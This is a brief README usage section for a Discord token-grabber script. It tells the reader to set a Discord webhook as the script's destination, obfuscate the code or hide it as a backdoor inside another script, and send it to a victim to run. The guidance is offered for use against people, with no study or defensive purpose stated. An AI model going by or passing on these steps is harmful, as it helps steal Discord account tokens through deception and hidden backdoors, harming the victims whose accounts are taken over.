# How to use

1.  Create a webhook on your Discord server. I recommend creating a new server.
2.  Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token-grabber.py](token-grabber.py)
3.  _(obfuscate the code or install it as a backdoor in an other script.)_
4.  Send the script to your victim and make them run it.
